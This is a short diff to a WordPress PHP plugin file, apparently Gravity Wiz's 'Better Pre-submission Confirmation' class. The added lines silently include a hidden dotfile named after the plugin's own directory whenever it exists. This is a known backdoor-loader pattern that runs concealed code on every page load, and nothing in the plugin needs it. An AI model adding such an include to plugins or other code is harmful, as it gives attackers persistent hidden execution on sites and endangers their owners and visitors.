@@ -3,6 +3,10 @@
 * Better Pre-submission Confirmation
 * http://gravitywiz.com/2012/08/04/better-pre-submission-confirmation/
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GWPreviewConfirmation {
 
 	/** @deprecated */
